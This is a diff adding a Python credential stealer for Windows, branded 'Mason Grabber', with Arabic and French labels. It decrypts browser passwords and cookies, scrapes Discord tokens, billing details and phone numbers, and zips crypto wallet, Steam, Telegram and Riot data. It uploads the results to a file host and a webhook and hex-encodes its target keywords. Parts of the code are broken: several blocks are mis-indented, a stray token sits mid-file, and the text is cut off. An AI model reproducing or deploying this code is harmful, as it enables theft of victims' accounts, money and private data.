@@ -1,0 +1,1188 @@
+import os, threading
+from sys import executable
+from sqlite3 import connect as sql_connect
+import re
+from base64 import b64decode
+from json import loads as json_loads, load
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from urllib.request import Request, urlopen
+from json import loads, dumps
+import time, shutil
+from zipfile import ZipFile
+import random, subprocess, platform, socket
+import time, os
+import getpass
+import subprocess
+import time
+import requests
+from Crypto.Cipher import AES
+from ctypes import Structure, POINTER, c_char, windll, wintypes
+import os
+whook = "%whook%"
+try:
+    from PIL import ImageGrab
+    import requests
+except ModuleNotFoundError:
+    os.system("pip install requests")
+    os.system("pip install Pillow")
+
+def getip():
+    ip = "None"
+    ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    return ip
+
+
+
+
+local = os.getenv("LOCALAPPDATA")
+roaming = os.getenv("APPDATA")
+temp = os.getenv("TEMP")
+Threadlist = []
+
+
+class DATA_BLOB(Structure):
+    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]
+
+
+
+def GetData(blob_out):
+    cbData = int(blob_out.cbData)
+    pbData = blob_out.pbData
+    buffer = c_buffer(cbData)
+    cdll.msvcrt.memcpy(buffer, pbData, cbData)
+    windll.kernel32.LocalFree(pbData)
+    return buffer.raw
+
+
+def CryptUnprotectData(encrypted_bytes, entropy=b""):
+    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
+    buffer_entropy = c_buffer(entropy, len(entropy))
+    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
+    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
+    blob_out = DATA_BLOB()
+
+    if windll.crypt32.CryptUnprotectData(byref(blob_in), None,
+                                         byref(blob_entropy), None, None, 0x01,
+                                         byref(blob_out)):
+        return GetData(blob_out)
+
+
+from Crypto.Cipher import AES
+
+def DecryptValue(buff, master_key=None):
+    starts = buff.decode(encoding="utf-8", errors="ignore")[:3]
+    if starts == "v10" or starts == "v11":
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+
+
+
+def LoadRequests(methode, url, data="", files="", headers=""):
+    for i in range(8):  
+        if methode == "\x50\x4f\x53\x54":
+            if data != "":
+                r = requests.post(url, data=data)
+                if r.status_code == 200:
+                    return r
+            elif files != "":
+                r = requests.post(url, files=files)
+                if (r.status_code == 200
+                        or r.status_code == 413):
+                    return r
+
+
+def LoadUrlib(whook, data="", files="", headers=""):
+    for i in range(8):
+        if headers != "":
+            r = urlopen(Request(whook, data=data, headers=headers))
+            return r
+        else:
+            r = urlopen(Request(whook, data=data))
+            return r
+
+
+payload = {"content": "@everyone **ضحيه جديد **"}
+
+response = requests.post(whook, json=payload)
+
+
+def globalInfo():
+    ip = getip()
+    username = os.getenv("USERNAME")
+    ipdatanojson = urlopen(Request(
+        f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace(
+            "calback(", "").replace("})", "}")
+    ipdata = loads(ipdatanojson)
+    country = ipdata["country_name"]
+    countryCode = ipdata["country_code"].lower()
+    globalinfo = f":flag_{countryCode}:   -   `{username.upper()} - {ip} [{country}]`"
+    return globalinfo
+
+
+import re
+
+def Trust(Cookies):
+    global DETECTED
+    data = str(Cookies)
+    tim = re.findall(".google.com", data)
+    if len(tim) < 1:
+        DETECTED = True
+        return DETECTED
+    else:
+        DETECTED = False
+        return DETECTED
+
+def GetUHQFriends(token):
+    badgeList = [
+        {
+            "Name": "Early_Verified_Bot_Developer",
+            "Value": 131072,
+            "Emoji": "<:developer:8747508084728253986> ",
+        },
+        {
+            "Name": "Bug_Hunter_Level_2",
+            "Value": 16384,
+            "Emoji": "<:bughunter_2:8747508084308473696> ",
+        },
+        {
+            "Name": "Early_Supporter",
+            "Value": 512,
+            "Emoji": "<:early_supporter:87475080841411411338> ",
+        },
+        {
+            "Name": "House_Balance",
+            "Value": 256,
+            "Emoji": "<:balance:87475080826729292> ",
+        },
+        {
+            "Name": "House_Brilliance",
+            "Value": 128,
+            "Emoji": "<:brilliance:87475080833860939> ",
+        },
+        {
+            "Name": "House_Bravery",
+            "Value": 64,
+            "Emoji": "<:bravery:87475080838952075> ",
+        },
+        {
+            "Name": "Bug_Hunter_Level_1",
+            "Value": 8,
+            "Emoji": "<:bughunter_1:8747508084266958> ",
+        },
+        {
+            "Name": "HypeSquad_Events",
+            "Value": 4,
+            "Emoji": "<:hypesquad_events:87475080859447056> ",
+        },
+        {
+            "Name": "Partnered_Server_Owner",
+            "Value": 2,
+            "Emoji": "<:partner:874750808673835496> ",
+        },
+        {
+            "Name": "Discord_Employee",
+            "Value": 1,
+            "Emoji": "<:staff:87475080837286631> ",
+        },
+    ]
+    return badgeList
+headers = {
+    "Authorization": token,
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+}
+
+try:
+    friendlist = loads(
+        urlopen(
+            Request(
+                "https://discord.com/api/v6/users/@me/relationships",
+                headers=headers,
+            )
+        ).read().decode()
+    )
+except:
+    return False
+
+uhqlist = ""
+for friend in friendlist:
+    OwnedBadges = ""
+    flags = friend["user"]["public_flags"]
+    for badge in badgeList:
+        if flags // badge["Value"] != 0 and friend["type"] == 1:
+            if not "House" in badge["Name"]:
+                OwnedBadges += badge["Emoji"]
+            flags = flags % badge["Value"]
+    if OwnedBadges != "":
+        uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
+return uhqlist
+
+
+def GetBilling(token):
+    headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+    }
+    try:
+        billingjson = loads(
+            urlopen(
+                Request(
+                    "https://discord.com/api/users/@me/billing/payment-sources",
+                    headers=headers,
+                )
+            ).read().decode()
+        )
+    except:
+        return False
+
+    if billingjson == []:
+        return "?"
+    
+    billing = ""
+    for method in billingjson:
+        if method["invalid"] == False:
+            if method["type"] == 1:
+                billing += ":credit_card:"
+            elif method["type"] == 2:
+                billing += ":parking: "
+
+    return billing
+
+
+def GetBadge(flags):
+    if flags == 0:
+        return ""
+
+OwnedBadges = ""
+badgeList = [
+    {
+        "Name": "Early_Verified_Bot_Developer",
+        "Value": 131072,
+        "Emoji": "<:developer:874750808472825986>"
+    },
+    {
+        "Name": "Bug_Hunter_Level_2",
+        "Value": 16384,
+        "Emoji": "<:bughunter_2:874750808430870366>"
+    },
+    {
+        "Name": "Early_Supporter",
+        "Value": 512,
+        "Emoji": "<:early_supporter:874750808414114123>"
+    },
+    {
+        "Name": "House_Balance",
+        "Value": 256,
+        "Emoji": "<:balance:8747508326783>"
+    },
+    {
+        "Name": "House_Brilliance",
+        "Value": 128,
+        "Emoji": "<:brilliance:8747508360860199>"
+    },
+    {
+        "Name": "House_Bravery",
+        "Value": 64,
+        "Emoji": "<:bravery:87475083889552075>"
+    },
+    {
+        "Name": "Bug_Hunter_Level_1",
+        "Value": 8,
+        "Emoji": "<:bughunter_1:87475080842366558>"
+    },
+    {
+        "Name": "HypeSquad_Events",
+        "Value": 4,
+        "Emoji": "<:hypesquad_events:87475080859464705>"
+    },
+    {
+        "Name": "Partnered_Server_Owner",
+        "Value": 2,
+        "Emoji": "<:partner:87475083677835>"
+    },
+    {
+        "Name": "Discord_Employee",
+        "Value": 1,
+        "Emoji": "<:staff:874750808722>"
+    },
+]
+for badge in badgeList:
+    if flags // badge["Value"] != 0:
+        OwnedBadges += badge["Emoji"]
+        flags = flags % badge["Value"]
+
+return OwnedBadges
+
+def GetTokenInfo(token):
+    headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+    }
+
+    userjson = loads(
+        urlopen(
+            Request("https://discord.com/api/v6/users/@me",
+                    headers=headers)).read().decode())
+    username = userjson["username"]
+    hashtag = userjson["discriminator"]
+    email = userjson["email"]
+    idd = userjson["id"]
+    pfp = userjson["avatar"]
+    flags = userjson["public_flags"]
+    nitro = ""
+    phone = "-"
+
+    if "premium_type" in userjson:
+        nitrot = userjson["premium_type"]
+        if nitrot == 1:
+            nitro = "<:classic:896119171019061906>"
+        elif nitrot == 2:
+            nitro = "<a:boost:824036777857041612> <:classic:896119171019061906>"
+
+    if "phone" in userjson:
+        phone = f'```{userjson["phone"]}```'
+
+    # Do something with the obtained information
+
+
+    return username, hashtag, email, idd, pfp, flags, nitro, phone
+
+
+def checkToken(token):
+    headers = {
+        "Authorization": token,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+    }
+    try:
+        urlopen(
+            Request("https://discord.com/api/v6/users/@me",
+                    headers=headers))
+        return True
+    except:
+        return False
+
+
+
+def uploadToken(token, path):
+    global whook
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+    }
+    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
+
+    if pfp == None:
+        pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
+    else:
+        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
+
+    billing = GetBilling(token)
+    badge = GetBadge(flags)
+    friends = GetUHQFriends(token)
+    if friends == "":
+        friends = "منبوذ"
+    if not billing:
+        badge, phone, billing = "🔒", "🔒", "🔒"
+    if nitro == "" and badge == "":
+        nitro = "?"
+
+
+data = {
+    "content": "",
+    "embeds": [{
+        "color": 0,
+        "fields": [
+            {
+                "name": ":tickets:   -   توكن الحساب:",
+                "value": f"```{token}```",
+            },
+            {
+                "name": ":earth_asia:   -   اليميل:",
+                "value": f"```{email}```",
+                "inline": True,
+            },
+            {
+                "name": ":telephone_receiver:   -   رقم الجوال:",
+                "value": f"{phone}",
+                "inline": True,
+            },
+            {
+                "name": ":globe_with_meridians:   -   الايبي:",
+                "value": f"```{getip()}```",
+                "inline": True,
+            },
+            {
+                "name": ":credit_card:   -   البطاقه:",
+                "value": f"{billing}",
+                "inline": True,
+            },
+            {
+                "name": ":office:   -   الاخويا:",
+                "value": f"{friends}",
+                "inline": False,
+            },
+        ],
+        "author": {
+            "name": f"{username}#{hashtag} ({idd})",
+            "icon_url": f"{pfp}",
+        },
+        "footer": {
+            "text": "https://www.youtube.com/@Grwb",
+            "icon_url": "",
+        },
+        "thumbnail": {
+            "url": f"{pfp}"
+        },
+    }],
+    "avatar_url": "",
+    "username": "Mason Grabber",
+    "attachments": [],
+}
+LoadUrlib(whook, data=dumps(data).encode(), headers=headers)
+
+
+def Reformat(listt):
+    e = re.findall("(\w+[a-z])", listt)
+    while "https" in e:
+        e.remove("https")
+    while "com" in e:
+        e.remove("com")
+    while "net" in e:
+        e.remove("net")
+    return list(set(e))
+
+
+def upload(name, link):
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+    }
+
+if name == "wpcook":
+    rb = "   -   ".join(da for da in cookiWords)
+    if len(rb) > 1000:
+        rrrrr = Reformat(str(cookiWords))
+        rb = "   -   ".join(da for da in rrrrr)
+    data = {
+        "content": "",
+        "embeds": [{
+            "title": "تم سحب الكوكيز ",
+            "description":
+            f"**المواقع الي جبناها**:\n{rb}\n\n**البيانات:**\n**{CookiCount}** Cookies \n[اضغط هنا لتحميل كوكيز الضحية]({link})",
+            "color": 0,
+            "footer": {
+                "text": "https://www.youtube.com/@Grwb",
+                "icon_url": "",
+            },
+            "author": {
+                "name": "",
+                "icon_url": "",
+            },
+            "thumbnail": {
+                "url": "",
+            },
+        }],
+        "username": "Mason Grabber",
+        "avatar_url": "",
+        "attachments": [],
+    }
+    LoadUrlib(whook, data=dumps(data).encode(), headers=headers)
+    return
+
+if name == "wppassw":
+    ra = "  -  ".join(da for da in paswWords)
+    if len(ra) > 1000:
+        rrr = Reformat(str(paswWords))
+        ra = "  -  ".join(da for da in rrr)
+
+    data = {
+        "content": "",
+        "embeds": [{
+            "title": "تم سحب الباسات",
+            "description":
+            f"**المواقع الي جبناها**:\n{ra}\n\n**البيانات:**\n**{PasswCount}** Cookies \n[اضغط هنا لتحميل باسات الضحية]({link})",
+            "color": 0,
+            "footer": {
+                "text": "https://www.youtube.com/@Grwb",
+                "icon_url": "",
+            },
+            "author": {
+                "name": "",
+                "icon_url": "",
+            },
+            "thumbnail": {
+                "url": "",
+            },
+        }],
+        "username": "Mason Grabber",
+        "avatar_url": "",
+        "attachments": [],
+    }
+    LoadUrlib(whook, data=dumps(data).encode(), headers=headers)
+    return
+encore
+
+def writeforfile(data, name):
+    path = os.getenv("TEMP") + f"\wp{name}.txt"
+    with open(path, mode="w", encoding="utf-8") as f:
+        f.write("zzzzzzzzz\n\n")
+        for line in data:
+            if line[0] != "":
+                f.write(f"{line}\n")
+
+
+
+Tokens = ""
+
+def getToken(path, arg):
+    if not os.path.exists(path):
+        return
+
+    path += arg
+    for file in os.listdir(path):
+        if file.endswith(".log") or file.endswith(".ldb"):
+            for line in [
+                x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()
+            ]:
+                for regex in (
+                    r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
+                    r"mfa\.[\w-]{80,95}",
+                ):
+                    for token in re.findall(regex, line):
+                        global Tokens
+                        if checkToken(token):
+                            if not token in Tokens:
+                                Tokens += token
+                                uploadToken(token, path)
+
+
+Passw = []
+
+
+def getPassw(path, arg):
+    global Passw, PasswCount
+    if not os.path.exists(path):
+        return
+
+    pathC = path + arg + "/Login Data"
+    if os.stat(pathC).st_size == 0:
+        return
+
+    tempfold = (
+        temp + "wp" +
+        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
+                for i in range(8)) + ".db")
+
+    shutil.copy2(pathC, tempfold)
+    conn = sql_connect(tempfold)
+    cursor = conn.cursor()
+    cursor.execute(
+        "SELECT action_url, username_value, password_value FROM logins;")
+    data = cursor.fetchall()
+    cursor.close()
+    conn.close()
+    os.remove(tempfold)
+
+    pathKey = path + "/Local State"
+    with open(pathKey, "r", encoding="utf-8") as f:
+        local_state = json.loads(f.read())
+    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    master_key = CryptUnprotectData(master_key[5:])
+
+for row in data:
+    if row[0] != "":
+        for wa in keyword:
+            old = wa
+            if "https" in wa:
+                tmp = wa
+                wa = tmp.split("[")[1].split("]")[0]
+            if wa in row[0]:
+                if old not in paswWords:
+                    paswWords.append(old)
+        Passw.append(
+            f"URL: {row[0]}|Username: {row[1]}|Password: {DecryptValue(row[2], master_key)}"
+        )
+        PasswCount += 1
+writeforfile(Passw, "pass")
+
+
+
+Cookies = []
+
+def getCookie(path, arg):
+    global Cookies, CookiCount
+    if not os.path.exists(path):
+        return
+
+    pathC = path + arg + "/Cookies"
+    if os.stat(pathC).st_size == 0:
+        return
+
+    tempfold = (
+        temp + "wp" +
+        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
+                for i in range(8)) + ".db")
+
+    shutil.copy2(pathC, tempfold)
+    conn = sql_connect(tempfold)
+    cursor = conn.cursor()
+    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+    data = cursor.fetchall()
+    cursor.close()
+    conn.close()
+    os.remove(tempfold)
+
+    pathKey = path + "/Local State"
+    with open(pathKey, "r", encoding="utf-8") as f:
+        local_state = json.loads(f.read())
+    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
+    master_key = CryptUnprotectData(master_key[5:])
+
+    for row in data:
+        if row[0] != "":
+            for wa in keyword:
+                old = wa
+                if "https" in wa:
+                    tmp = wa
+                    wa = tmp.split("[")[1].split("]")[0]
+                if wa in row[0]:
+                    if old not in cookiWords:
+                        cookiWords.append(old)
+            Cookies.append(
+                f"{row[0]} {row[1]} {DecryptValue(row[2], master_key)}"
+            )
+            CookiCount += 1
+    writeforfile(Cookies, "cookie")
+
+def GetDiscord(path, arg):
+    if not os.path.exists(f"{path}/Local State"):
+        return
+
+    pathC = path + arg
+
+    pathKey = path + "/Local State"
+    with open(pathKey, "r", encoding="utf-8") as f:
+        local_state = json.loads(f.read())
+    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
+    master_key = CryptUnprotectData(master_key[5:])
+
+    for file in os.listdir(pathC):
+        if file.endswith(".log") or file.endswith(".ldb"):
+            for line in [
+                    x.strip() for x in open(f"{pathC}/{file}",
+                                            errors="ignore").readlines()
+                    if x.strip()
+            ]:
+                for token in re.findall(
+                        r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                    global Tokens
+                    tokenDecoded = DecryptValue(
+                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
+                    if checkToken(tokenDecoded):
+                        if not tokenDecoded in Tokens:
+                            Tokens += tokenDecoded
+                            uploadToken(tokenDecoded, path)
+
+
+def GatherZips(paths1, paths2, paths3):
+    thttht = []
+    for patt in paths1:
+        a = threading.Thread(target=ZipThings,
+                             args=[patt[0], patt[5], patt[1]])
+        a.start()
+        thttht.append(a)
+
+    for patt in paths2:
+        a = threading.Thread(target=ZipThings,
+                             args=[patt[0], patt[2], patt[1]])
+        a.start()
+        thttht.append(a)
+
+    a = threading.Thread(target=ZipTelegram,
+                         args=[paths3[0], paths3[2], paths3[1]])
+    a.start()
+    thttht.append(a)
+
+    for thread in thttht:
+        thread.join()
+    global WalletsZip, GamingZip, OtherZip
+
+    wal, ga, ot = "", "", ""
+    if not len(WalletsZip) == 0:
+        wal = ":coin Wallets\n"
+        for i in WalletsZip:
+            wal += f"└─ [{i[0]}]({i[1]})\n"
+    if not len(GamingZip) == 0:
+        ga = ":video_game Gaming:\n"
+        for i in GamingZip:
+            ga += f"└─ [{i[0]}]({i[1]})\n"
+    if not len(OtherZip) == 0:
+        ot = ":tickets Apps\n"
+        for i in OtherZip:
+            ot += f"└─ [{i[0]}]({i[1]})\n"
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+    }
+
+
+def ZipTelegram(path, arg, procc):
+    global OtherZip
+    pathC = path
+    name = arg
+    if not os.path.exists(pathC):
+        return
+    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+
+    zf = ZipFile(f"{pathC}/{name}.zip", "w")
+    for file in os.listdir(pathC):
+        if (not ".zip" in file and not "tdummy" in file
+                and not "user_data" in file and not "webview" in file):
+            zf.write(pathC + "/" + file)
+    zf.close()
+
+    link = "https://google.com"
+    os.remove(f"{pathC}/{name}.zip")
+    OtherZip.append([arg, link])
+
+
+def ZipThings(path, arg, procc):
+    pathC = path
+    name = arg
+    global WalletsZip, GamingZip, OtherZip
+
+    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
+        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
+        name = f"Metamask_{browser}"
+        pathC = path + arg
+
+    if not os.path.exists(pathC):
+        return
+    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+
+    if "Wallet" in arg or "NavigationsHistory" in arg:
+        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
+        name = f"{browser}"
+
+    elif "Steam" in arg:
+        if not os.path.isfile(f"{pathC}/loginusers.vdf"):
+            return
+        f = open(f"{pathC}/loginusers.vdf", "rb")
+        data = f.readlines()
+        found = False
+        for line in data:
+            if b'RememberPassword"\t\t"1"' in line:
+                found = True
+        f.close()
+        if not found:
+            return
+        name = arg
+
+    zf = ZipFile(f"{pathC}/{name}.zip", "w")
+    for file in os.listdir(pathC):
+        if not ".zip" in file:
+            zf.write(pathC + "/" + file)
+    zf.close()
+
+    link = "https://google.com"
+    os.remove(f"{pathC}/{name}.zip")
+
+    if "Wallet" in arg or "ethereumwallet" in arg:
+        WalletsZip.append([name, link])
+    elif "NavigationsHistory" in name or "Steam" in name or "RiotCli" in name:
+        GamingZip.append([name, link])
+    else:
+        OtherZip.append([name, link])
+
+
+def GatherAll():
+    "Default Path < 0 >         ProcessName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >             Extensions < 5 >"
+
+browserPaths = [
+    [
+        f"{roaming}/Opera Software/Opera GX Stable",
+        "opera.exe",
+        "/Local Storage/leveldb",
+        "/",
+        "/Network",
+        "/Local Extension Settings/nkbihefbgoeaeohlkelfnkbefgpgknn",
+    ],
+    [
+        f"{roaming}/Opera Software/Opera Stable",
+        "opera.exe",
+        "/Local Storage/leveldb",
+        "/",
+        "/Network",
+        "/Local Extension Settings/nkbihefbgoeaeohlkelfnkbefgpgknn",
+    ],
+    [
+        f"{roaming}/Opera Software/Opera Neon/User Data/Default",
+        "opera.exe",
+        "/Local Storage/leveldb",
+        "/",
+        "/Network",
+        "/Local Extension Settings/nkbihefbgoeaeohlkelfnkbefgpgknn",
+    ],
+    [
+        f"{local}/Google/Chrome/User Data/Default",
+        "chrome.exe",
+        "/Default/Local Storage/leveldb",
+        "/Default",
+        "/Default/Network",
+        "/Default/Local Extension Settings/nkbihefbgoeaeohlkelfnkbefgpgknn",
+    ],
+    [
+        f"{local}/Google/Chrome SxS/User Data/Default",
+        "chrome.exe",
+        "/Default/Local Storage/leveldb",
+        "/Default",
+        "/Default/Network",
+        "/Default/Local Extension Settings/nkbihefbgoeaeohlkelfnkbefgpgknn",
+    ],
+    [
+        f"{local}/BraveSoftware/Brave-Browser/User Data/Default",
+        "brave.exe",
+        "/Default/Local Storage/leveldb",
+        "/Default",
+        "/Default/Network",
+        "/Default/Local Extension Settings/nkbihefbgoeaeohlkelfnkbefgpgknn",
+    ],
+    [
+        f"{local}/Yandex/YandexBrowser/User Data",
+        "yandex.exe",
+        "/Default/Local Storage/leveldb",
+        "/Default",
+        "/HougaBouga/nkbihefbgoeaeohlkelfnkbefgpgknn",
+    ],
+    [
+        f"{local}/Microsoft/Edge/User Data",
+        "edge.exe",
+        "/Default/Local Storage/leveldb",
+        "/Default",
+        "/Default/Network",
+        "/Default/Local Extension Settings/nkbihefbgoeaeohlkelfnkbefgpgknn",
+    ],
+]
+
+
+discordPaths = [
+    [f"{roaming}/Discord", "/Local Storage/leveldb"],
+    [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
+    [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
+    [f"{roaming}/discordptb", "/Local Storage/leveldb"],
+]
+
+PathsToZip = [
+    [
+        f"{roaming}/atomics/Local Storage/leveldb",
+        '"Atomic Wallet.exe"',
+        "Wallet"
+    ],
+    [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
+    ["C:\\Program Files (x86)\\Steam\\config", "steam.exe", "Steam"],
+    [
+        f"{roaming}/NationGLory/Local Storage/leveldb",
+        "NationsGlory.exe",
+        "NationsGlory",
+    ],
+    [
+        f"{local}/Riot Games/Riot Client/Data",
+        "RiotClientServices.exe",
+        "RiotClient",
+    ],
+]
+
+import threading
+
+Telegram = [
+    f"{roaming}/Telegram Desktop/tdata",
+    "telegram.exe",
+    "Telegram"
+]
+
+Threadlist = []
+
+# Récupération des jetons (tokens) des navigateurs
+for patt in browserPaths:
+    a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
+    a.start()
+    Threadlist.append(a)
+
+# Récupération des informations de Discord
+for patt in discordPaths:
+    a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
+    a.start()
+    Threadlist.append(a)
+
+# Récupération des mots de passe des navigateurs
+for patt in browserPaths:
+    a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
+    a.start()
+    Threadlist.append(a)
+
+ThCokk = []
+
+# Récupération des cookies des navigateurs
+for patt in browserPaths:
+    a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
+    a.start()
+    ThCokk.append(a)
+
+# Exécution de la fonction GatherZips dans un thread séparé
+threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
+
+# Attente de la fin de tous les threads de récupération des cookies
+for thread in ThCokk:
+    thread.join()
+
+# Vérification de confiance des cookies
+DETECTED = Trust(Cookies)
+if DETECTED:
+    return
+
+# Attente de la fin de tous les threads précédents
+for thread in Threadlist:
+    thread.join()
+
+upths = []
+
+# Upload de certains fichiers
+for file in ["wpassw.txt", "wpcook.txt"]:
+    upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
+
+def uploadToAnonfiles(path):
+    try:
+        return requests.post(
+            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
+            files={
+                "file": open(path, "rb")
+            },
+        ).json()["data"]["downloadPage"]
+    except:
+        return False
+
+def KiwiFolder(pathF, keywords):
+    global KiwiFiles
+    maxfilesperdir = 7
+    i = 0
+    listOfFile = os.listdir(pathF)
+    ffound = []
+    for file in listOfFile:
+        if not os.path.isfile(pathF + "/" + file):
+            return
+        i += 1
+        if i <= maxfilesperdir:
+            url = uploadToAnonfiles(pathF + "/" + file)
+            ffound.append([pathF + "/" + file, url])
+        else:
+            break
+    KiwiFiles.append(["folder", pathF + "/", ffound])
+
+
+
+KiwiFiles = []
+
+
+def KiwiFile(path, keywords):
+    global KiwiFiles
+    fifound = []
+    listOfFile = os.listdir(path)
+    for file in listOfFile:
+        for worf in keywords:
+            if worf in file.lower():
+                if os.path.isfile(path + "/" + file) and ".txt" in file:
+                    fifound.append([
+                        path + "/" + file,
+                        uploadToAnonfiles(path + "/" + file)
+                    ])
+                    break
+                if os.path.isdir(path + "/" + file):
+                    target = path + "/" + file
+                    KiwiFolder(target, keywords)
+                    break
+
+    KiwiFiles.append(["folder", path, fifound])
+
+def Kiwi():
+    user = temp.split("\\AppData")[0]
+    path2search = [
+        user + "\\Desktop", user + "\\Downloads", user + "\\Documents"
+    ]
+
+    key_wordsFolder = ["account", "count", "passw", "secret"]
+
+    key_wordsFiles = [
+        "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret", "account", "count", "paypal", "banque", "account", "memask", "wallet", "wallet", "crypto<|endoftext|>
+
+
+global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip
+
+keyword = [
+    "\x6d\x61\x69\x6c",
+    "\x5b\x63\x6f\x69\x6e\x62\x61\x73\x65\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6f\x69\x6e\x62\x61\x73\x65\x2e\x63\x6f\x6d\x29",
+    "\x5b\x73\x65\x6c\x6c\x69\x78\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x65\x6c\x6c\x69\x78\x2e\x69\x6f\x29",
+    "\x5b\x67\x6d\x61\x69\x6c\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6d\x61\x69\x6c\x2e\x63\x6f\x6d\x29",
+    "\x5b\x73\x74\x65\x61\x6d\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x74\x65\x61\x6d\x2e\x63\x6f\x6d\x29",
+    "\x5b\x64\x69\x73\x63\x6f\x72\x64\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x29",
+    "\x5b\x72\x69\x6f\x74\x67\x61\x6d\x65\x73\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x69\x6f\x74\x67\x61\x6d\x65\x73\x2e\x63\x6f\x6d\x29",
+    "\x5b\x79\x6f\x75\x74\x75\x62\x65\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x29",
+    "\x5b\x69\x6e\x73\x74\x61\x67\x72\x61\x6d\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x6e\x73\x74\x61\x67\x72\x61\x6d\x2e\x63\x6f\x6d\x29",
+    "\x5b\x74\x69\x6b\x74\x6f\x6b\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x69\x6b\x74\x6f\x6b\x2e\x63\x6f\x6d\x29",
+    "\x5b\x74\x77\x69\x74\x74\x65\x72\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x77\x69\x74\x74\x65\x72\x2e\x63\x6f\x6d\x29",
+    "\x5b\x66\x61\x63\x65\x62\x6f\x6f\x6b\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x29",
+    "\x63\x61\x72\x64",
+    "\x5b\x65\x70\x69\x63\x67\x61\x6d\x65\x73\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x70\x69\x63\x67\x61\x6d\x65\x73\x2e\x63\x6f\x6d\x29",
+    "\x5b\x73\x70\x6f\x74\x69\x66\x79\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x70\x6f\x74\x69\x66\x79\x2e\x63\x6f\x6d\x29",
+    "\x5b\x79\x61\x68\x6f\x6f\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x79\x61\x68\x6f\x6f\x2e\x63\x6f\x6d\x29",
